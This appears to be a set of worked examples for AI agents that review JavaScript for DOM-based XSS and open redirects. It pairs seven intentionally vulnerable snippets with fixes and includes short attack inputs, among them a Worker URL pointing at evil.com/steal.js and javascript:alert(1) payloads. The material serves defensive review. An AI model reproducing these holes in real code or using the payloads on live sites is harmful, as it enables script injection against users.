# Worked Examples

One example per agent category. Include the relevant example in each agent's prompt.

---

## Agent 1: Location-based

```javascript
// app/auth/callback.js
function handleOAuthCallback() {
  const params = new URLSearchParams(window.location.search);  // line 2
  const returnTo = params.get('return_to');                     // line 3
  if (returnTo) {
    window.location.href = returnTo;                            // line 5 — SINK
  }
}
```
- **Source**: `window.location.search` → param `return_to` (fully attacker-controlled)
- **Sink**: `window.location.href = returnTo` (line 5)
- **Sanitization**: None. `if (returnTo)` only checks non-null.
- **Verdict**: CRITICAL / HIGH confidence
- **Recommendation**: Parse with `new URL(returnTo, location.origin)` and verify `.origin === location.origin`.

---

## Agent 2: Eval / Code Execution

```javascript
// app/processing/task-runner.js
function startWorker() {
  const workerPath = new URLSearchParams(location.search).get('worker');  // line 2
  const w = new Worker(workerPath || '/default-worker.js');               // line 3 — SINK
  w.postMessage({ action: 'start' });
}
```
- **Source**: URL param `worker` (line 2)
- **Sink**: `new Worker(workerPath || ...)` (line 3). Fallback only applies when param is null.
- **Verdict**: CRITICAL / HIGH confidence — `?worker=https://evil.com/steal.js`
- **Recommendation**: Hardcode worker paths or use strict allowlist.

---

## Agent 3: innerHTML / outerHTML

```javascript
// app/views/search-results.js
async function showResults() {
  const q = new URLSearchParams(location.search).get('q');
  const resp = await fetch('/api/search?q=' + encodeURIComponent(q));
  const data = await resp.json();
  let html = '<ul>';
  data.results.forEach(r => {
    html += '<li><a href="' + r.url + '">' + r.title + '</a></li>';  // line 7
  });
  document.getElementById('results').innerHTML = html;                // line 10 — SINK
}
```
- **Source**: URL param `q` → API response fields `r.url`, `r.title`
- **Sink**: `innerHTML = html` (line 10). `encodeURIComponent` protects the API request, NOT the HTML output.
- **Verdict**: HIGH / MEDIUM confidence — depends on whether API sanitizes output
- **Recommendation**: Use DOM API (`createElement` + `textContent`) or DOMPurify.

---

## Agent 4: document.write

```javascript
// app/analytics/tracker.js
(function() {
  var ref = document.referrer;
  var campaign = location.search.match(/utm_campaign=([^&]*)/);
  campaign = campaign ? campaign[1] : 'none';
  document.write('<img src="//t.example.com/px?ref=' + ref + '&c=' + campaign + '">');  // SINK
})();
```
- **Sources**: `document.referrer` + URL param `utm_campaign` — both attacker-controlled
- **Sink**: `document.write` with unsanitized concatenation into HTML attribute context
- **Verdict**: HIGH / HIGH confidence
- **Recommendation**: `var img = new Image(); img.src = '...' + encodeURIComponent(ref) + ...`

---

## Agent 5: Framework-specific

```jsx
// app/components/UserProfile.jsx
function UserProfile({ bio, website }) {
  return (
    <div>
      <div dangerouslySetInnerHTML={{__html: DOMPurify.sanitize(bio)}} />  {/* SAFE */}
      <a href={website}>Visit website</a>                                  {/* SINK */}
    </div>
  );
}
```
- **Source**: `website` prop — caller-controlled, likely from user profile API
- **Sink**: `<a href={website}>` — `javascript:alert(1)` works in React <16.9
- **Verdict**: MEDIUM / MEDIUM confidence — framework-specific; JSX gives false safety for href
- **Recommendation**: Validate with `new URL(website)`, check `.protocol` is `https:` or `http:`.

---

## Agent 6: PostMessage

```javascript
// app/integrations/widget-loader.js
window.addEventListener('message', function(event) {
  if (event.origin.endsWith('.widgets.example.com')) {           // origin check
    const msg = JSON.parse(event.data);
    if (msg.type === 'render') {
      document.getElementById('widget-area').innerHTML = msg.html;  // SINK 1
    } else if (msg.type === 'redirect') {
      window.location.href = msg.url;                               // SINK 2
    }
  }
});
```
- **Origin check**: `endsWith('.widgets.example.com')` — vulnerable to subdomain takeover
- **Sinks**: innerHTML (CRITICAL if bypassed) and location.href (open redirect/XSS)
- **Verdict**: MEDIUM / MEDIUM confidence — exploitation requires subdomain control
- **Recommendation**: Use strict equality `event.origin === 'https://widgets.example.com'`. Sanitize `msg.html` with DOMPurify.

---

## Agent 7: iframe / embed

```javascript
// app/embeds/video-player.js
function loadEmbed() {
  const provider = new URLSearchParams(location.search).get('provider');
  const videoId = new URLSearchParams(location.search).get('id');
  const iframe = document.createElement('iframe');
  if (provider === 'youtube') {
    iframe.src = 'https://www.youtube.com/embed/' + videoId;
  } else {
    iframe.src = provider + '/embed/' + videoId;           // SINK — fully controlled
  }
  // No sandbox attribute
  document.getElementById('player').appendChild(iframe);
}
```
- **Source**: URL params `provider` and `id`
- **Sink**: `iframe.src = provider + '/embed/' + videoId` in else branch — fully attacker-controlled
- **No sandbox**: iframe has full privileges
- **Verdict**: CRITICAL / HIGH confidence — `?provider=javascript:alert(1)//`
- **Recommendation**: Hardcode provider allowlist. Always add `sandbox="allow-scripts"` (without `allow-same-origin`). Validate videoId as alphanumeric.
